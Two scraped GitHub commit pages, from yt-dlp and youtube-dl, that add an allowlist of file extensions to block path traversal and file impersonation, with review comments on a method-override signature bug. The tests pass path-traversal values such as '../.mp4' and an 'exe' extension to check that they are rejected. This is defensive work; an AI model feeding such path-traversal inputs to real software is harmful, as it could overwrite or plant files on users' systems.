|  |  | 'ytdl', |
|  |  |  |
|  |  | # video |
|  |  | \*MEDIA\_EXTENSIONS.video, |
|  |  | 'avif', |
|  |  | 'ismv', |
|  |  | 'm2ts', |
|  |  | 'm4s', |
|  |  | 'mng', |
|  |  | 'mpeg', |
|  |  | 'qt', |
|  |  | 'swf', |
|  |  | 'ts', |
|  |  | 'vp9', |
|  |  | 'wvm', |
|  |  |  |
|  |  | # audio |
|  |  | \*MEDIA\_EXTENSIONS.audio, |
|  |  | 'isma', |
|  |  | 'mid', |
|  |  | 'mpga', |
|  |  | 'ra', |
|  |  |  |
|  |  | # image |
|  |  | \*MEDIA\_EXTENSIONS.thumbnails, |
|  |  | 'bmp', |
|  |  | 'gif', |
|  |  | 'heic', |
|  |  | 'ico', |
|  |  | 'jng', |
|  |  | 'jpeg', |
|  |  | 'jxl', |
|  |  | 'svg', |
|  |  | 'tif', |
|  |  | 'wbmp', |
|  |  |  |
|  |  | # subtitle |
|  |  | \*MEDIA\_EXTENSIONS.subtitles, |
|  |  | 'dfxp', |
|  |  | 'fs', |
|  |  | 'ismt', |
|  |  | 'sami', |
|  |  | 'scc', |
|  |  | 'ssa', |
|  |  | 'tt', |
|  |  | 'ttml', |
|  |  |  |
|  |  | # others |
|  |  | \*MEDIA\_EXTENSIONS.manifests, |
|  |  | \*MEDIA\_EXTENSIONS.storyboards, |
|  |  | 'desktop', |
|  |  | 'ism', |
|  |  | 'm3u', |
|  |  | 'sbv', |
|  |  | 'url', |
|  |  | 'webloc', |
|  |  | 'xml', |
|  |  | ]) |
|  |  |  |
|  |  | def \_\_init\_\_(self, extension, /): |
|  |  | super().\_\_init\_\_(f'unsafe file extension: {extension!r}') |
|  |  | self.extension = extension |
|  |  |  |
|  |  | @classmethod |
|  |  | def sanitize\_extension(cls, extension, /, \*, prepend=False): |
|  |  | if '/' in extension or '\\' in extension: |
|  |  | raise cls(extension) |
|  |  |  |
|  |  | if not prepend: |
|  |  | \_, \_, last = extension.rpartition('.') |
|  |  | if last == 'bin': |
|  |  | extension = last = 'unknown\_video' |
|  |  | if last.lower() not in cls.ALLOWED\_EXTENSIONS: |
|  |  | raise cls(extension) |
|  |  |  |
|  |  | return extension |
|  |  |  |
|  |  |  |
|  |  | class RetryManager: |
|  |  | """Usage: |
|  |  | for retry in RetryManager(...): |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 4 comments on commit `5ce5824`

[![@rdamas](https://avatars.githubusercontent.com/u/15088943?s=80&v=4)](/rdamas)

Copy link

Contributor

### @rdamas **[rdamas](/rdamas)** commented on `[5ce5824](/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a)` [Jul 2, 2024](#commitcomment-143745778) ‚Ä¢ edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

To let this not fail unexpectedly: shouldn't the signatures of sanitize\_extension() and the overridden lambda's match?

I.e. at least something like: `_UnsafeExtensionError.sanitize_extension = lambda x, prepend=False: x`?

Sorry, something went wrong.

All reactions

[![@bashonly](https://avatars.githubusercontent.com/u/88596187?s=80&v=4)](/bashonly)

Copy link

Member

### @bashonly **[bashonly](/bashonly)** commented on `[5ce5824](/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a)` [Jul 2, 2024](#commitcomment-143746178)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Anything to the left of `/` is a positional-only argument and anything to the right of `*` is a keyword-only argument, so overriding with `lambda x: x` is valid. The only way it could fail is if more positional-only arguments were added to the signature, in which case something like `lambda x, prepend=False: x` would also fail

Sorry, something went wrong.

All reactions

[![@rdamas](https://avatars.githubusercontent.com/u/15088943?s=80&v=4)](/rdamas)

Copy link

Contributor

### @rdamas **[rdamas](/rdamas)** commented on `[5ce5824](/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a)` [Jul 2, 2024](#commitcomment-143746778) ‚Ä¢ edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I thought so as well, but shouldn't this snippet then work? (Using Python 3.12.4)

```
class _UnsafeExtensionError(Exception):

    @classmethod
    def sanitize_extension(cls, extension, /, *, prepend=False):
        print('in class with', extension)

_UnsafeExtensionError.sanitize_extension = lambda x: x
_UnsafeExtensionError.sanitize_extension('abc', prepend=True)

```

Instead for me it throws a TypeError:

```
TypeError: <lambda>() got an unexpected keyword argument 'prepend'

```

AFAICT it's called this way in .utils.\_utils.\_change\_extension()

Sorry, something went wrong.

 üëç
2
 bashonly and Grub4K reacted with thumbs up emoji

All reactions

* üëç
  2 reactions

[![@bashonly](https://avatars.githubusercontent.com/u/88596187?s=80&v=4)](/bashonly)

Copy link

Member

### @bashonly **[bashonly](/bashonly)** commented on `[5ce5824](/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a)` [Jul 2, 2024](#commitcomment-143747269)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

ah, I see now. Nice catch

Sorry, something went wrong.

All reactions

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyt-dlp%2Fyt-dlp%2Fcommit%2F5ce582448ececb8d9c30c8c31f58330090ced03a) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_0a0fac40_20250111_204605.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fytdl-org%2Fyoutube-dl%2Fcommit%2Fd42a222ed541b96649396ef00e19552aef0f09ec)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fytdl-org%2Fyoutube-dl%2Fcommit%2Fd42a222ed541b96649396ef00e19552aef0f09ec)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=ytdl-org%2Fyoutube-dl)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ytdl-org](/ytdl-org)
/
**[youtube-dl](/ytdl-org/youtube-dl)**
Public

* [Notifications](/login?return_to=%2Fytdl-org%2Fyoutube-dl) You must be signed in to change notification settings
* [Fork
  10.2k](/login?return_to=%2Fytdl-org%2Fyoutube-dl)
* [Star
   134k](/login?return_to=%2Fytdl-org%2Fyoutube-dl)

* [Code](/ytdl-org/youtube-dl)
* [Issues
  3.7k](/ytdl-org/youtube-dl/issues)
* [Pull requests
  497](/ytdl-org/youtube-dl/pulls)
* [Actions](/ytdl-org/youtube-dl/actions)
* [Projects
  0](/ytdl-org/youtube-dl/projects)
* [Security](/ytdl-org/youtube-dl/security)
* [Insights](/ytdl-org/youtube-dl/pulse)

Additional navigation options

* [Code](/ytdl-org/youtube-dl)
* [Issues](/ytdl-org/youtube-dl/issues)
* [Pull requests](/ytdl-org/youtube-dl/pulls)
* [Actions](/ytdl-org/youtube-dl/actions)
* [Projects](/ytdl-org/youtube-dl/projects)
* [Security](/ytdl-org/youtube-dl/security)
* [Insights](/ytdl-org/youtube-dl/pulse)

## Commit

[Permalink](/ytdl-org/youtube-dl/commit/d42a222ed541b96649396ef00e19552aef0f09ec)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

[core,utils] Implement unsafe file extension mitigation

[Browse files](/ytdl-org/youtube-dl/tree/d42a222ed541b96649396ef00e19552aef0f09ec)
Browse the repository at this point in the history

```
* from <https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4>, thx grub4k
```

* Loading branch information

[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)

[dirkf](/ytdl-org/youtube-dl/commits?author=dirkf "View all commits by dirkf")
committed
Jul 1, 2024

1 parent
[072a43e](/ytdl-org/youtube-dl/commit/072a43e0e328411a8ecca00c966105bc53503352)

commit d42a222

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**209 additions**
and
**43 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* test

  + test/test\_utils.py
    [test\_utils.py](#diff-1780a2492dac55d0b4c5ff13cd3cf852a72cdac8995e17b10c87eeb678b3179e)
* youtube\_dl

  + youtube\_dl/YoutubeDL.py
    [YoutubeDL.py](#diff-cd3da4993ae5eb3fd1f4793531615a2bb752c4af819f04c4874e8fcf5bd13f45)
  + youtube\_dl/utils.py
    [utils.py](#diff-1066dbe4b265b9b095f027959fde8c2f9f06ec1fbcb72068051892167eda1c5e)

## There are no files selected for viewing

46 changes: 46 additions & 0 deletions

46
[test/test\_utils.py](#diff-1780a2492dac55d0b4c5ff13cd3cf852a72cdac8995e17b10c87eeb678b3179e "test/test_utils.py")

Show comments

[View file](/ytdl-org/youtube-dl/blob/d42a222ed541b96649396ef00e19552aef0f09ec/test/test_utils.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -14,9 +14,11 @@ |
|  |  | import io |
|  |  | import itertools |
|  |  | import json |
|  |  | import types |
|  |  | import xml.etree.ElementTree |
|  |  |  |
|  |  | from youtube\_dl.utils import ( |
|  |  | \_UnsafeExtensionError, |
|  |  | age\_restricted, |
|  |  | args\_to\_str, |
|  |  | base\_url, |
| Expand Down  Expand Up | | @@ -270,6 +272,27 @@ def env(var): |
|  |  | expand\_path('~/%s' % env('YOUTUBE\_DL\_EXPATH\_PATH')), |
|  |  | '%s/expanded' % compat\_getenv('HOME')) |
|  |  |  |
|  |  | \_uncommon\_extensions = [ |
|  |  | ('exe', 'abc.exe.ext'), |
|  |  | ('de', 'abc.de.ext'), |
|  |  | ('../.mp4', None), |
|  |  | ('..\\.mp4', None), |
|  |  | ] |
|  |  |  |
|  |  | def assertUnsafeExtension(self, ext=None): |
|  |  | assert\_raises = self.assertRaises(\_UnsafeExtensionError) |
|  |  | assert\_raises.ext = ext |
|  |  | orig\_exit = assert\_raises.\_\_exit\_\_ |
|  |  |  |
|  |  | def my\_exit(self\_, exc\_type, exc\_val, exc\_tb): |
|  |  | did\_raise = orig\_exit(exc\_type, exc\_val, exc\_tb) |
|  |  | if did\_raise and assert\_raises.ext is not None: |
|  |  | self.assertEqual(assert\_raises.ext, assert\_raises.exception.extension, 'Unsafe extension not as unexpected') |
|  |  | return did\_raise |
|  |  |  |
|  |  | assert\_raises.\_\_exit\_\_ = types.MethodType(my\_exit, assert\_raises) |
|  |  | return assert\_raises |
|  |  |  |
|  |  | def test\_prepend\_extension(self): |
|  |  | self.assertEqual(prepend\_extension('abc.ext', 'temp'), 'abc.temp.ext') |
|  |  | self.assertEqual(prepend\_extension('abc.ext', 'temp', 'ext'), 'abc.temp.ext') |
| Expand All | | @@ -278,6 +301,19 @@ def test\_prepend\_extension(self): |
|  |  | self.assertEqual(prepend\_extension('.abc', 'temp'), '.abc.temp') |
|  |  | self.assertEqual(prepend\_extension('.abc.ext', 'temp'), '.abc.temp.ext') |
|  |  |  |
|  |  | # Test uncommon extensions |
|  |  | self.assertEqual(prepend\_extension('abc.ext', 'bin'), 'abc.bin.ext') |
|  |  | for ext, result in self.\_uncommon\_extensions: |
|  |  | with self.assertUnsafeExtension(ext): |
|  |  | prepend\_extension('abc', ext) |
|  |  | if result: |
|  |  | self.assertEqual(prepend\_extension('abc.ext', ext, 'ext'), result) |
|  |  | else: |
|  |  | with self.assertUnsafeExtension(ext): |
|  |  | prepend\_extension('abc.ext', ext, 'ext') |
|  |  | with self.assertUnsafeExtension(ext): |
|  |  | prepend\_extension('abc.unexpected\_ext', ext, 'ext') |
|  |  |  |
|  |  | def test\_replace\_extension(self): |
|  |  | self.assertEqual(replace\_extension('abc.ext', 'temp'), 'abc.temp') |
|  |  | self.assertEqual(replace\_extension('abc.ext', 'temp', 'ext'), 'abc.temp') |
| Expand All | | @@ -286,6 +322,16 @@ def test\_replace\_extension(self): |
|  |  | self.assertEqual(replace\_extension('.abc', 'temp'), '.abc.temp') |
|  |  | self.assertEqual(replace\_extension('.abc.ext', 'temp'), '.abc.temp') |
|  |  |  |
|  |  | # Test uncommon extensions |
|  |  | self.assertEqual(replace\_extension('abc.ext', 'bin'), 'abc.unknown\_video') |
|  |  | for ext, \_ in self.\_uncommon\_extensions: |
|  |  | with self.assertUnsafeExtension(ext): |
|  |  | replace\_extension('abc', ext) |
|  |  | with self.assertUnsafeExtension(ext): |
|  |  | replace\_extension('abc.ext', ext, 'ext') |
|  |  | with self.assertUnsafeExtension(ext): |
|  |  | replace\_extension('abc.unexpected\_ext', ext, 'ext') |
|  |  |  |
|  |  | def test\_subtitles\_filename(self): |
|  |  | self.assertEqual(subtitles\_filename('abc.ext', 'en', 'vtt'), 'abc.en.vtt') |
|  |  | self.assertEqual(subtitles\_filename('abc.ext', 'en', 'vtt', 'ext'), 'abc.en.vtt') |
| Expand Down | |  |

17 changes: 17 additions & 0 deletions

17
[youtube\_dl/YoutubeDL.py](#diff-cd3da4993ae5eb3fd1f4793531615a2bb752c4af819f04c4874e8fcf5bd13f45 "youtube_dl/YoutubeDL.py")

Show comments

[View file](/ytdl-org/youtube-dl/blob/d42a222ed541b96649396ef00e19552aef0f09ec/youtube_dl/YoutubeDL.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -7,6 +7,7 @@ |
|  |  | import copy |
|  |  | import datetime |
|  |  | import errno |
|  |  | import functools |
|  |  | import io |
|  |  | import itertools |
|  |  | import json |
| Expand Down  Expand Up | | @@ -53,6 +54,7 @@ |
|  |  | compat\_urllib\_request\_DataHandler, |
|  |  | ) |
|  |  | from .utils import ( |
|  |  | \_UnsafeExtensionError, |
|  |  | age\_restricted, |
|  |  | args\_to\_str, |
|  |  | bug\_reports\_message, |
| Expand Down  Expand Up | | @@ -129,6 +131,20 @@ |
|  |  | import ctypes |
|  |  |  |
|  |  |  |
|  |  | def \_catch\_unsafe\_file\_extension(func): |
|  |  | @functools.wraps(func) |
|  |  | def wrapper(self, \*args, \*\*kwargs): |
|  |  | try: |
|  |  | return func(self, \*args, \*\*kwargs) |
|  |  | except \_UnsafeExtensionError as error: |
|  |  | self.report\_error( |
|  |  | '{0} found; to avoid damaging your system, this value is disallowed.' |
|  |  | ' If you believe this is an error{1}').format( |
|  |  | error.message, bug\_reports\_message(',')) |
|  |  |  |
|  |  | return wrapper |
|  |  |  |
|  |  |  |
|  |  | class YoutubeDL(object): |
|  |  | """YoutubeDL class. |
|  |  |  |
| Expand Down  Expand Up | | @@ -1925,6 +1941,7 @@ def print\_optional(field): |
|  |  | if self.params.get('forcejson', False): |
|  |  | self.to\_stdout(json.dumps(self.sanitize\_info(info\_dict))) |
|  |  |  |
|  |  | @\_catch\_unsafe\_file\_extension |
|  |  | def process\_info(self, info\_dict): |
|  |  | """Process a single resolved IE result.""" |
|  |  |  |
| Expand Down | |  |

189 changes: 146 additions & 43 deletions

189
[youtube\_dl/utils.py](#diff-1066dbe4b265b9b095f027959fde8c2f9f06ec1fbcb72068051892167eda1c5e "youtube_dl/utils.py")

Show comments

[View file](/ytdl-org/youtube-dl/blob/d42a222ed541b96649396ef00e19552aef0f09ec/youtube_dl/utils.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -1717,39 +1717,6 @@ def random\_user\_agent(): |
|  |  | 'PST': -8, 'PDT': -7 # Pacific |
|  |  | } |
|  |  |  |
|  |  |  |
|  |  | class Namespace(object): |
|  |  | """Immutable namespace""" |
|  |  |  |
|  |  | def \_\_init\_\_(self, \*\*kw\_attr): |
|  |  | self.\_\_dict\_\_.update(kw\_attr) |
|  |  |  |
|  |  | def \_\_iter\_\_(self): |
|  |  | return iter(self.\_\_dict\_\_.values()) |
|  |  |  |
|  |  | @property |
|  |  | def items\_(self): |
|  |  | return self.\_\_dict\_\_.items() |
|  |  |  |
|  |  |  |
|  |  | MEDIA\_EXTENSIONS = Namespace( |
|  |  | common\_video=('avi', 'flv', 'mkv', 'mov', 'mp4', 'webm'), |
|  |  | video=('3g2', '3gp', 'f4v', 'mk3d', 'divx', 'mpg', 'ogv', 'm4v', 'wmv'), |
|  |  | common\_audio=('aiff', 'alac', 'flac', 'm4a', 'mka', 'mp3', 'ogg', 'opus', 'wav'), |
|  |  | audio=('aac', 'ape', 'asf', 'f4a', 'f4b', 'm4b', 'm4p', 'm4r', 'oga', 'ogx', 'spx', 'vorbis', 'wma', 'weba'), |
|  |  | thumbnails=('jpg', 'png', 'webp'), |
|  |  | # storyboards=('mhtml', ), |
|  |  | subtitles=('srt', 'vtt', 'ass', 'lrc', 'ttml'), |
|  |  | manifests=('f4f', 'f4m', 'm3u8', 'smil', 'mpd'), |
|  |  | ) |
|  |  | MEDIA\_EXTENSIONS.video = MEDIA\_EXTENSIONS.common\_video + MEDIA\_EXTENSIONS.video |
|  |  | MEDIA\_EXTENSIONS.audio = MEDIA\_EXTENSIONS.common\_audio + MEDIA\_EXTENSIONS.audio |
|  |  |  |
|  |  | KNOWN\_EXTENSIONS = ( |
|  |  | MEDIA\_EXTENSIONS.video + MEDIA\_EXTENSIONS.audio |
|  |  | + MEDIA\_EXTENSIONS.manifests |
|  |  | ) |
|  |  |  |
|  |  | # needed for sanitizing filenames in restricted mode |
|  |  | ACCENT\_CHARS = dict(zip('√Ç√É√Ñ√Ä√Å√Ö√Ü√á√à√â√ä√ã√å√ç√é√è√ê√ë√í√ì√î√ï√ñ≈ê√ò≈í√ô√ö√õ√ú≈∞√ù√û√ü√†√°√¢√£√§√•√¶√ß√®√©√™√´√¨√≠√Æ√Ø√∞√±√≤√≥√¥√µ√∂≈ë√∏≈ì√π√∫√ª√º≈±√Ω√æ√ø', |
|  |  | itertools.chain('AAAAAA', ['AE'], 'CEEEEIIIIDNOOOOOOO', ['OE'], 'UUUUUY', ['TH', 'ss'], |
| Expand Down  Expand Up | | @@ -3977,19 +3944,22 @@ def parse\_duration(s): |
|  |  | return duration |
|  |  |  |
|  |  |  |
|  |  | def prepend\_extension(filename, ext, expected\_real\_ext=None): |
|  |  | def \_change\_extension(prepend, filename, ext, expected\_real\_ext=None): |
|  |  | name, real\_ext = os.path.splitext(filename) |
|  |  | return ( |
|  |  | '{0}.{1}{2}'.format(name, ext, real\_ext) |
|  |  | if not expected\_real\_ext or real\_ext[1:] == expected\_real\_ext |
|  |  | else '{0}.{1}'.format(filename, ext)) |
|  |  | sanitize\_extension = \_UnsafeExtensionError.sanitize\_extension |
|  |  |  |
|  |  | if not expected\_real\_ext or real\_ext.partition('.')[0::2] == ('', expected\_real\_ext): |
|  |  | filename = name |
|  |  | if prepend and real\_ext: |
|  |  | sanitize\_extension(ext, prepend=prepend) |
|  |  | return ''.join((filename, '.', ext, real\_ext)) |
|  |  |  |
|  |  | def replace\_extension(filename, ext, expected\_real\_ext=None): |
|  |  | name, real\_ext = os.path.splitext(filename) |
|  |  | return '{0}.{1}'.format( |
|  |  | name if not expected\_real\_ext or real\_ext[1:] == expected\_real\_ext else filename, |
|  |  | ext) |
|  |  | # Mitigate path traversal and file impersonation attacks |
|  |  | return '.'.join((filename, sanitize\_extension(ext))) |
|  |  |  |
|  |  |  |
|  |  | prepend\_extension = functools.partial(\_change\_extension, True) |
|  |  | replace\_extension = functools.partial(\_change\_extension, False) |
|  |  |  |
|  |  |  |
|  |  | def check\_executable(exe, args=[]): |
| Expand Down  Expand Up | | @@ -6579,3 +6549,136 @@ def join\_nonempty(\*values, \*\*kwargs): |
|  |  | if from\_dict is not None: |
|  |  | values = (traverse\_obj(from\_dict, variadic(v)) for v in values) |
|  |  | return delim.join(map(compat\_str, filter(None, values))) |
|  |  |  |
|  |  |  |
|  |  | class Namespace(object): |
|  |  | """Immutable namespace""" |
|  |  |  |
|  |  | def \_\_init\_\_(self, \*\*kw\_attr): |
|  |  | self.\_\_dict\_\_.update(kw\_attr) |
|  |  |  |
|  |  | def \_\_iter\_\_(self): |
|  |  | return iter(self.\_\_dict\_\_.values()) |
|  |  |  |
|  |  | @property |
|  |  | def items\_(self): |
|  |  | return self.\_\_dict\_\_.items() |
|  |  |  |
|  |  |  |
|  |  | MEDIA\_EXTENSIONS = Namespace( |
|  |  | common\_video=('avi', 'flv', 'mkv', 'mov', 'mp4', 'webm'), |
|  |  | video=('3g2', '3gp', 'f4v', 'mk3d', 'divx', 'mpg', 'ogv', 'm4v', 'wmv'), |
|  |  | common\_audio=('aiff', 'alac', 'flac', 'm4a', 'mka', 'mp3', 'ogg', 'opus', 'wav'), |
|  |  | audio=('aac', 'ape', 'asf', 'f4a', 'f4b', 'm4b', 'm4p', 'm4r', 'oga', 'ogx', 'spx', 'vorbis', 'wma', 'weba'), |
|  |  | thumbnails=('jpg', 'png', 'webp'), |
|  |  | # storyboards=('mhtml', ), |
|  |  | subtitles=('srt', 'vtt', 'ass', 'lrc', 'ttml'), |
|  |  | manifests=('f4f', 'f4m', 'm3u8', 'smil', 'mpd'), |
|  |  | ) |
|  |  | MEDIA\_EXTENSIONS.video = MEDIA\_EXTENSIONS.common\_video + MEDIA\_EXTENSIONS.video |
|  |  | MEDIA\_EXTENSIONS.audio = MEDIA\_EXTENSIONS.common\_audio + MEDIA\_EXTENSIONS.audio |
|  |  |  |
|  |  | KNOWN\_EXTENSIONS = ( |
|  |  | MEDIA\_EXTENSIONS.video + MEDIA\_EXTENSIONS.audio |
|  |  | + MEDIA\_EXTENSIONS.manifests |
|  |  | ) |
|  |  |  |
|  |  |  |
|  |  | class \_UnsafeExtensionError(Exception): |
|  |  | """ |
|  |  | Mitigation exception for unwanted file overwrite/path traversal |
|  |  | This should be caught in YoutubeDL.py with a warning |
|  |  |  |
|  |  | Ref: https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j |
|  |  | """ |
|  |  | \_ALLOWED\_EXTENSIONS = frozenset(itertools.chain( |
|  |  | ( # internal |
|  |  | 'description', |
|  |  | 'json', |
|  |  | 'meta', |
|  |  | 'orig', |
|  |  | 'part', |
|  |  | 'temp', |
|  |  | 'uncut', |
|  |  | 'unknown\_video', |
|  |  | 'ytdl', |
|  |  | ), |
|  |  | # video |
|  |  | MEDIA\_EXTENSIONS.video, ( |
|  |  | 'avif', |
|  |  | 'ismv', |
|  |  | 'm2ts', |
|  |  | 'm4s', |
|  |  | 'mng', |
|  |  | 'mpeg', |
|  |  | 'qt', |
|  |  | 'swf', |
|  |  | 'ts', |
|  |  | 'vp9', |
|  |  | 'wvm', |
|  |  | ), |
|  |  | # audio |
|  |  | MEDIA\_EXTENSIONS.audio, ( |
|  |  | 'isma', |
|  |  | 'mid', |
|  |  | 'mpga', |
|  |  | 'ra', |
|  |  | ), |
|  |  | # image |
|  |  | MEDIA\_EXTENSIONS.thumbnails, ( |
|  |  | 'bmp', |
|  |  | 'gif', |
|  |  | 'ico', |
|  |  | 'heic', |
|  |  | 'jng', |
|  |  | 'jpeg', |
|  |  | 'jxl', |
|  |  | 'svg', |
|  |  | 'tif', |
|  |  | 'wbmp', |
|  |  | ), |
|  |  | # subtitle |
|  |  | MEDIA\_EXTENSIONS.subtitles, ( |
|  |  | 'dfxp', |
|  |  | 'fs', |
|  |  | 'ismt', |
|  |  | 'sami', |
|  |  | 'scc', |
|  |  | 'ssa', |
|  |  | 'tt', |
|  |  | ), |
|  |  | # others |
|  |  | MEDIA\_EXTENSIONS.manifests, |
|  |  | ( |
|  |  | # not used in yt-dl |
|  |  | # \*MEDIA\_EXTENSIONS.storyboards, |
|  |  | # 'desktop', |
|  |  | # 'ism', |
|  |  | # 'm3u', |
|  |  | # 'sbv', |
|  |  | # 'swp', |
|  |  | # 'url', |
|  |  | # 'webloc', |
|  |  | # 'xml', |
|  |  | ))) |
|  |  |  |
|  |  | def \_\_init\_\_(self, extension): |
|  |  | super(\_UnsafeExtensionError, self).\_\_init\_\_('unsafe file extension: {0!r}'.format(extension)) |
|  |  | self.extension = extension |
|  |  |  |
|  |  | @classmethod |
|  |  | def sanitize\_extension(cls, extension, \*\*kwargs): |
|  |  | # ... /, \*, prepend=False |
|  |  | prepend = kwargs.get('prepend', False) |
|  |  |  |
|  |  | if '/' in extension or '\\' in extension: |
|  |  | raise cls(extension) |
|  |  |  |
|  |  | if not prepend: |
|  |  | last = extension.rpartition('.')[-1] |
|  |  | if last == 'bin': |
|  |  | extension = last = 'unknown\_video' |
|  |  | if last.lower() not in cls.\_ALLOWED\_EXTENSIONS: |
|  |  | raise cls(extension) |
|  |  |  |
|  |  | return extension |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `d42a222`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fytdl-org%2Fyoutube-dl%2Fcommit%2Fd42a222ed541b96649396ef00e19552aef0f09ec) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
